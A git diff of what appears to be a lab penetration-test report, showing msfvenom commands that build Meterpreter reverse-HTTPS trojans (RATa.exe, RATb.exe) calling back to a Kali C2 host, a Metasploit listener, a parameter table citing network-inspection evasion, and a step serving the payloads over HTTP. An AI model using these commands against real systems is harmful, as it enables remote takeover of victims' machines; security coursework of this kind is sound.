@@ -10,13 +10,6 @@ below are initial notes that may or may not be relevant to final report
 
 NOTES:
 
--have not disabled real-time monitoring/tamper protection yet
-
--trying to test disabling script
-
-<img width="890" height="139" alt="image" src="https://github.com/user-attachments/assets/71141d52-0e1a-4c7d-9525-ff37611a40a9" />
-
-word macro below:
 
 
 
@@ -40,12 +33,24 @@ The assessment identified a critical misconfiguration in the local security poli
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATa.exe
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATb.exe   #Payload for option b, port selection assumes previous payload was ended
 
+| Parameter | Value | Justification |
+|:---|:---|:---|
+| `-p windows/x64/meterpreter/reverse_https` | Payload module | x64 architecture matches target Windows 10 VM; HTTPS encapsulates C2 traffic in TLS to evade network inspection |
+| `LHOST=192.168.92.136` | Kali IP | Specifies the C2 server address the RAT will phone home to; must match the listener exactly |
+| `LPORT=14000` | Port | High port above 12000 as required; avoids well-known port scrutiny while satisfying lab constraints |
+| `-f exe` | Output format | Produces a standalone Windows executable suitable for direct execution |
+| `-o RATa.exe` | Output filename | Distinct name to differentiate from RATb across the two delivery vectors |
+
 # Listener Setup
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_https
 set LHOST 192.168.92.136
 set LPORT 14000
 exploit -j
+
+# RAT Hosting on C2
+cd ~/RATs
+python3 -m http.server 8080
 ```
 
 **Macro Creation:**
